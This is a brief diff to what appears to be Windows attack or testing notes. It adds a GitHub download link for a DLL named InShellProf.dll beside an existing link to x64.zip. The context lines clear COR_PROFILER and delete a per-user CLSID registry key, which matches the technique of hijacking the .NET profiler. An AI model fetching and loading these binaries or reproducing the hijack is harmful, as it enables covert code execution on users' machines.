@@ -12,3 +12,4 @@ set COR_PROFILER=
 REG DELETE "HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-b283c03916db}" /f
 
 https://github.com/Sanket-kumbhar/testing-win/raw/refs/heads/main/x64.zip
+https://github.com/Sanket-kumbhar/testing-win/raw/refs/heads/main/InShellProf.dll
